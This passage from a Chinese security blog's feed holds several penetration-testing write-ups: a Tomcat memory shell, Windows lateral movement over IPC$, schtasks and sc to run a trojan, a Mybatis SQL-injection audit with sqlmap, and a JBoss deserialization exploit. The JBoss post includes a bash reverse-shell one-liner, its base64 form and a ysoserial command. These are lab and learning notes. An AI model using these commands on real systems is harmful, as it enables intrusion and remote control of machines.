class="line">%&gt;</span><br></pre></td></tr></table></figure><p>最终jsp文件将其命名为3.jsp，然后只需<strong>传到web目录并访问一次jsp文件，然后再将/3.jsp换成/?cmd=whoami</strong>访问即可：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/6.png" alt></p><p>注入成功后，访问路径触发：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat内存马&quot;&gt;&lt;a href=&quot;#Tomcat内存马&quot; class=&quot;headerlink&quot; title=&quot;Tomcat内存马&quot;&gt;&lt;/a&gt;Tomcat内存马&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;filter型&lt;/li&gt;
&lt;li&gt;servlet型&lt;/li&gt;
&lt;li&gt;l
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>横向移动</title>
    <link href="http://bai-ren-1.github.io/2021/07/07/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://bai-ren-1.github.io/2021/07/07/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2021-07-07T09:13:16.000Z</published>
    <updated>2021-07-08T07:18:56.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>记录总结。抄自：<a href="https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKMLr6nw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKMLr6nw</a></p><h2 id="0x00-IPC连接"><a href="#0x00-IPC连接" class="headerlink" title="0x00 IPC连接"></a>0x00 IPC连接</h2><blockquote><p> IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。两个IP之间只能建立一个IPC$连接。 通过这个连接，可以实现在被连接的目标机器上搞文件上传、下载、命令执行 。</p></blockquote><h3 id="00-IPC-计划任务"><a href="#00-IPC-计划任务" class="headerlink" title="00 IPC$+计划任务"></a>00 IPC$+计划任务</h3><p>使用IPC$配合计划任务实现横向移动的<strong>大体思路</strong>如下：</p><ul><li>首先建立向目标主机的<code>IPC$</code>连接。</li><li>其次把命令执行的脚本传到目标主机。</li><li>再次创建计划任务在目标机器上执行命令脚本。</li><li>最后过河拆桥删除<code>IPC$</code>连接。</li></ul><p>使用IPC$配合计划任务实现横向移动的<strong>利用条件</strong>如下：</p><ul><li>目标机器没有禁用<code>IPC$</code>连接，没有什么防火防盗拦截<code>IPC$</code>，139 445 端口也开了（能走445走445，不能则走139</li><li>目标机器小管理员开了<code>IPC$</code>默认共享服务（逻辑盘、系统目录；都不开我访问个啥？）</li><li>获取了目标机器的<strong>小管理员的管理员权限的账号密码</strong>（最好是域管理员账号密码），明文的</li><li>目标系统能支持<code>IPC$</code>，且和攻击机能彼此互通（废话）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用本地命令copy或者用CS beacon的upload，把自己写的或者是工具生成的木马搞到目标机器上。接下来创建windows计划任务，自动执行木马反弹连接到攻击机器。自动执行木马操作在windows中最常用的就是计划任务at和schtasks。</span><br></pre></td></tr></table></figure><h4 id="001-IPC-命令"><a href="#001-IPC-命令" class="headerlink" title="001 IPC$命令"></a>001 IPC$命令</h4><p>建立IPC连接并查看：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //建立IPC连接</span><br><span class="line"><span class="built_in">net</span> use //查看当前主机所建立的连接</span><br></pre></td></tr></table></figure><p>ipc连接还有一个常用的命令就是进行本地映射，如果在命令行里面查看目录觉得很麻烦的话可以使用如下命令将已经建立IPC连接的主机的任意盘符映射到自己的本地：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">138</span>\c$ //列举目标盘符目录</span><br><span class="line"><span class="built_in">net</span> use z: \\ip\c$ password /user:Administrator //把目标C盘映射到本地z盘(未建立ipc连接的情况下)</span><br><span class="line"><span class="built_in">net</span> use z: \\ip\c$ //把目标C盘映射到本地z盘(已建立ipc连接的情况下)</span><br></pre></td></tr></table></figure><p>删除IPC连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$</span><br></pre></td></tr></table></figure><h4 id="002-at命令实现计划任务"><a href="#002-at命令实现计划任务" class="headerlink" title="002 at命令实现计划任务"></a>002 at命令实现计划任务</h4><blockquote><p>at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。 </p></blockquote><p>at命令在内网中的利用方法：</p><p>在获取webshell后不能够执行系统命令的情况下可以用<strong>at命令将命令执行后写入txt再用type读取</strong>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> <span class="number">16</span>:<span class="number">40</span>:<span class="number">00</span> <span class="built_in">cmd</span>.exe /c " whoami(等命令) &gt; c:\result.txt"</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span>\c$\result.txt</span><br></pre></td></tr></table></figure><p>利用at计划任务命令上线cs或者msf（<strong>IPC搭配at命令计划任务实现横向，即该章节内容</strong>）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //与目标机器建立IPC连接</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip //确定时间</span><br><span class="line"><span class="built_in">copy</span> &lt;木马在本机位置&gt; \\&lt;靶机ip&gt;\c$ //把cs生成的木马利用<span class="built_in">copy</span>命令拷贝到主机上</span><br><span class="line"><span class="built_in">at</span> \\&lt;靶机ip&gt; &lt;启动时间&gt; &lt;木马在靶机的位置&gt; //使用<span class="built_in">at</span>命令创建计划任务</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> <span class="number">1</span> /delete //删除计划任务(这里的<span class="number">1</span>为创建计划任务时候的ID)</span><br></pre></td></tr></table></figure><h4 id="003-schtasks命令实现计划任务"><a href="#003-schtasks命令实现计划任务" class="headerlink" title="003 schtasks命令实现计划任务"></a>003 schtasks命令实现计划任务</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //与目标机器建立IPC连接</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip //确定时间</span><br><span class="line"><span class="built_in">copy</span> &lt;木马在本机位置&gt; \\&lt;靶机ip&gt;\c$ //把cs生成的木马利用<span class="built_in">copy</span>命令拷贝到主机上</span><br><span class="line">schtasks /create /TN cs /TR C:\artifact.exe /SC once /ST <span class="number">17</span>:<span class="number">32</span> //创建名为cs的计划任务</span><br><span class="line">schtasks /query /TN cs //查看创建的计划任务</span><br><span class="line">schtasks /delete /tn "cs" //删除计划任务</span><br></pre></td></tr></table></figure><h3 id="01-IPC-Windows服务"><a href="#01-IPC-Windows服务" class="headerlink" title="01 IPC$+Windows服务"></a>01 IPC$+Windows服务</h3><h4 id="001-SC命令"><a href="#001-SC命令" class="headerlink" title="001 SC命令"></a>001 SC命令</h4><blockquote><p> sc命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。 </p></blockquote><p>与靶机建立ipc连接，拷贝exe到主机系统上。在靶机上创建一个shell的服务并启动，最后删除：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-M836NN6NU8B create shell binpath= "c:\artifact.exe" //创建一个shell的服务</span><br><span class="line">sc \\WIN-M836NN6NU8B <span class="built_in">start</span> shell //启动shell服务</span><br><span class="line">sc \\[host] delete [servicename] //删除shell服务</span><br></pre></td></tr></table></figure><h2 id="0x01-Psexec工具"><a href="#0x01-Psexec工具" class="headerlink" title="0x01 Psexec工具"></a>0x01 Psexec工具</h2><blockquote><p> psexec是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。 </p></blockquote><p>使用Psexec的<strong>大体思路</strong>如下：</p><ul><li>通过<code>ipc$</code>连接<code>admin$</code>，释放二进制文件<code>psexecsvc.exe</code>到目标 。</li><li>通过服务管理<code>SCManager</code>远程创建一个<code>psexec</code>服务，并启动服务 。</li><li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据 。</li><li>运行结束后删除服务 。</li></ul><p>使用Psexec的<strong>利用条件</strong>如下：</p><ul><li>对方主机开启了 <code>admin$</code>共享，如果关闭了<code>admin$</code>共享，会提示：找不到网络名 </li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。 </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;横向移动&quot;&gt;&lt;a href=&quot;#横向移动&quot; class=&quot;headerlink&quot; title=&quot;横向移动&quot;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;p&gt;记录总结。抄自：&lt;a href=&quot;https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKML
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计之Mybatis框架SQL注入</title>
    <link href="http://bai-ren-1.github.io/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://bai-ren-1.github.io/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-06-20T08:58:39.000Z</published>
    <updated>2021-06-20T11:26:50.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计之Mybatis框架SQL注入"><a href="#Java审计之Mybatis框架SQL注入" class="headerlink" title="Java审计之Mybatis框架SQL注入"></a>Java审计之Mybatis框架SQL注入</h1><p>Java简单开源软件的审计。Mybatis框架在某些情况下处理不当就会造成SQL，参考文章：<a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q</a></p><h2 id="0x00-版本信息"><a href="#0x00-版本信息" class="headerlink" title="0x00 版本信息"></a>0x00 版本信息</h2><ul><li>Java版本 v 1.8.0_211</li><li>IntelliJ IDEA v 2019.3.1 </li><li>Tomcat v 9.0.33</li><li>因酷教育 v 2.0</li></ul><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><h3 id="00-MySQL配置"><a href="#00-MySQL配置" class="headerlink" title="00 MySQL配置"></a>00 MySQL配置</h3><p>虽然是Java语言，但是为了方便，仍然使用WAMP环境来提供MySQL功能。开启Wampserver，使用SQLyog连接。在左侧的数据库连接处点击右键，选择“执行SQL脚本”，随后选择源码中提供的.sql文件导入并执行：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/1.png" alt></p><p>使用源码中的.sql执行时会出现一些执行错误，这里也暂时不管。等执行一半语句后，选择我们要使用的数据库，在查询界面重新导入.sql中的SQL语句执行，就能导入数据了：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/10.png" alt></p><h3 id="01-IDEA配置"><a href="#01-IDEA配置" class="headerlink" title="01 IDEA配置"></a>01 IDEA配置</h3><p>直接使用IDEA导入项目，配置JDK和Maven这些就不赘述，直接等IDEA把pom.xml拉完。然后根据软件说明文档，还需要安装lombok插件，选择“File - setting - plugin“搜索lombok并安装即可：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/3.png" alt></p><h3 id="02-属性配置"><a href="#02-属性配置" class="headerlink" title="02 属性配置"></a>02 属性配置</h3><p>选择”\src\main\resources\project.properties“，修改配置和修改”sql主机地址，数据库名，用户名，密码， 项目访问路径“这几个属性，即可正常访问项目：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/4.png" alt></p><h3 id="03-Maven编译"><a href="#03-Maven编译" class="headerlink" title="03 Maven编译"></a>03 Maven编译</h3><p>选择右侧菜单栏的Maven，依次选择”clean“和”install“执行：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/5.png" alt></p><h3 id="04-部署项目"><a href="#04-部署项目" class="headerlink" title="04 部署项目"></a>04 部署项目</h3><p>选择”Run - Edit Configurations - Maven“，在工作目录选择当前项目，然后命令行选择”tomcat7:run“：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/6.png" alt></p><p>选择Run运行项目，访问82端口即可访问项目。因为刚刚数据库的原因会出现错误如下：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/7.png" alt></p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>是个后台漏洞，首先进入后台。因为使用的是原生的测试数据，直接登录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试账号：admin 111111</span><br></pre></td></tr></table></figure><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/8.png" alt></p><p>跟踪到漏洞地址： <a href="http://x.x.x.x:82/admin/article/delete" target="_blank" rel="noopener">http://x.x.x.x:82/admin/article/delete</a></p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/9.png" alt></p><p>点击删除文章按钮，使用Burp抓包。这里我的Burp是抓不了本地地址，于是我把项目的地址重新配成非本地地址然后重新启动并能成功抓到包：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/11.png" alt></p><p>将抓取到的数据包保存为文本，直接丢进SQLMap跑看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r E:\inxedu.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/12.png" alt></p><p>成功注出数据库名！</p><h2 id="0x03-漏洞跟踪"><a href="#0x03-漏洞跟踪" class="headerlink" title="0x03 漏洞跟踪"></a>0x03 漏洞跟踪</h2><p>首先审计一个CMS，肯定是得先熟悉它的项目结构：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/13.png" alt></p><h3 id="00-Mybatis分辨"><a href="#00-Mybatis分辨" class="headerlink" title="00 Mybatis分辨"></a>00 Mybatis分辨</h3><p>点开Java项目的dao层下的任意文件，看看Mybatis是使用了<strong>注解开发还是配置文件开发</strong>。我们随便点开dao层的文章dao， 没发现有Mybatis的注解，那就肯定是使用了配置XML的方式 ：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/14.png" alt></p><h3 id="01-搜索映射文件"><a href="#01-搜索映射文件" class="headerlink" title="01 搜索映射文件"></a>01 搜索映射文件</h3><p>在<strong>resources文件夹</strong>中找到与其对应的<strong>映射配置文件</strong>：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/15.png" alt></p><p>根据博客最开头的Mybatis框架产生注入的原因，直接搜索<strong>使用了$且没进行过滤</strong>的内容：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/16.png" alt></p><h3 id="02-定位Dao接口"><a href="#02-定位Dao接口" class="headerlink" title="02 定位Dao接口"></a>02 定位Dao接口</h3><p>根据ID”deleteArticleByIds“<strong>找到对应的dao接口</strong>”ArticleDao“：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/17.png" alt></p><h3 id="03-跟进Service实现"><a href="#03-跟进Service实现" class="headerlink" title="03 跟进Service实现"></a>03 跟进Service实现</h3><p>通过<strong>点击”ctrl+左键“</strong>选择Dao中函数名跟进到 <strong>对应的service层的实现</strong>deleteArticleByIds。往上看，可以看到Service实现方法并<strong>未对传入Dao层处理的变量articleIds进行过有效过滤，这也导致Dao中的ids变量未过滤</strong>：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/18.png" alt></p><blockquote><p>审计主要关注Service层代码，过滤处理的会从service层去实现， 而此处并没有发现过滤的代码 。</p></blockquote><h3 id="04-定位Controller"><a href="#04-定位Controller" class="headerlink" title="04 定位Controller"></a>04 定位Controller</h3><p>接下来就可以去找<strong>该service对应的Controller</strong>，这个可以使用idea的<strong>ctrl+Alt+H快捷键去查询调用层次找到Controller的位置</strong>。</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/22.png" alt></p><p>通过查看调用结构，我们可以<strong>定位到控制器</strong>”AdminArticleController.java“：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/19.png" alt></p><p>通过调用结构我们可以看出：如果在控制器的路由下如果加上<strong>/delete路由</strong>，就会触发<strong>该控制器类中写的deleteArticle方法</strong>。而该控制器类中的deleteArticle方法实现如下，实际上调用的就是<strong>Service层中的deleteArticleByIds</strong>，而我们已经分析过是存在SQL注入的：</p><p><img src="/2021/06/20/Java%E5%AE%A1%E8%AE%A1%E4%B9%8BMybatis%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5/21.png" alt></p><p>看回/delete路由下的方法，其中<strong>deleteArticle方法中的变量</strong>aridArr是通过<strong>request请求中的articelId变量</strong>直接获取的，<strong>即是由我们可控</strong>的。所以，符合存在SQL注入且变量是我们所可控且没过滤，故存在漏洞。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个框架还是有很多类似场景的SQL注入，这里就不一一赘述了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计之Mybatis框架SQL注入&quot;&gt;&lt;a href=&quot;#Java审计之Mybatis框架SQL注入&quot; class=&quot;headerlink&quot; title=&quot;Java审计之Mybatis框架SQL注入&quot;&gt;&lt;/a&gt;Java审计之Mybatis框架SQL注入&lt;/
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Jboss反序列化</title>
    <link href="http://bai-ren-1.github.io/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-06-14T10:32:14.000Z</published>
    <updated>2021-06-14T12:14:08.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Jboss反序列化"><a href="#Jboss反序列化" class="headerlink" title="Jboss反序列化"></a>Jboss反序列化</h1><p>记录记录。</p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>直接使用Vulhub环境搭建即可，方便快捷。<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h2 id="0x01-CVE-2017-12149"><a href="#0x01-CVE-2017-12149" class="headerlink" title="0x01 CVE-2017-12149"></a>0x01 CVE-2017-12149</h2><h3 id="00-启动环境"><a href="#00-启动环境" class="headerlink" title="00 启动环境"></a>00 启动环境</h3><p>进入到目录中，使用docker开启环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/jboss/CVE-2017-12149</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><p>访问靶机的8080端口能看到一下界面说明开启成功。</p><h3 id="01-Payload准备"><a href="#01-Payload准备" class="headerlink" title="01 Payload准备"></a>01 Payload准备</h3><p>我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中执行的符号与bash命令可能有差别：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><p>因此可以通过使用编码进行转换处理，实现网站：<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson-t.ca/runtime-exec-payloads.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.87/7777 0&gt;&amp;1</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuODcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>然后通过ysoserial工具，生成最终的反序列化攻击Payload。因为Vulhub环境较新，使用CommonsCollections6的Gadget来生成我们的最终Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuODcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.ser</span><br></pre></td></tr></table></figure><p>在相同目录下生成的1.ser就是我们得到的反序列化攻击的Payload</p><h3 id="02-反序列化攻击"><a href="#02-反序列化攻击" class="headerlink" title="02 反序列化攻击"></a>02 反序列化攻击</h3><p>CVE-2017-12149是出现在/invoker/readonly请求中，服务器会将用户提交的POST内容进行Java反序列化，从而造成攻击。使用BP抓取/invoker/readonly的请求，在POST主体处右键点击”Paste from file“选择1.ser，然后把HTTP请求方式修改未POST：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><p>在攻击机准备好监听端口，使用nc监听本机的7777端口：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><p>然后BP发包，靶机的Jboss就会对POST内容进行反序列化，从而执行反弹shell的命令。我们在攻击机上就能收到反弹的shell：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>至此CVE-2017-12149复现成功，记得关闭docker环境：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>以后再补充其他Jboss的漏洞复现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Jboss反序列化&quot;&gt;&lt;a href=&quot;#Jboss反序列化&quot; class=&quot;headerlink&quot; title=&quot;Jboss反序列化&quot;&gt;&lt;/a&gt;Jboss反序列化&lt;/h1&gt;&lt;p&gt;记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>1DAY挖掘经验之通达OAPatch分析</title>
    <link href="http://bai-ren-1.github.io/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/"/>
    <id>http://bai-ren-1.github.io/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/</id>
    <published>2021-06-10T08:18:12.000Z</published>
    <updated>2021-06-14T10:31:44.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1DAY挖掘经验之通达OAPatch分析"><a href="#1DAY挖掘经验之通达OAPatch分析" class="headerlink" title="1DAY挖掘经验之通达OAPatch分析"></a>1DAY挖掘经验之通达OAPatch分析</h1><p>看到写的这篇文章真的好，特来复现学习一番。<a href="https://www.anquanke.com/post/id/210395#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210395#h2-3</a></p><h2 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h2><p>假设看到通达OA的官网的补丁更新。<a href="https://www.tongda2000.com/news/p673.php。则可以根据披露的漏洞大致信息，通过diff打补丁的代码定位到代码变化，从而找到漏洞细节。" target="_blank" rel="noopener">https://www.tongda2000.com/news/p673.php。则可以根据披露的漏洞大致信息，通过diff打补丁的代码定位到代码变化，从而找到漏洞细节。</a></p><blockquote><p>日期: 2020.03.13<br>任意文件上传 影响版本: &lt;=v11<br>任意文件包含,影响版本: =v11</p></blockquote><ul><li>DiffMerge - 对比代码</li><li>SeayDzend - 解密通达OA的加密代码</li><li>通达OA v11.3 - 未Patch漏洞版本</li><li>通达OA补丁  2020_A1.11.3 - Patch</li></ul><h2 id="0x01-解密和对比"><a href="#0x01-解密和对比" class="headerlink" title="0x01 解密和对比"></a>0x01 解密和对比</h2><p>直接安装通达OA 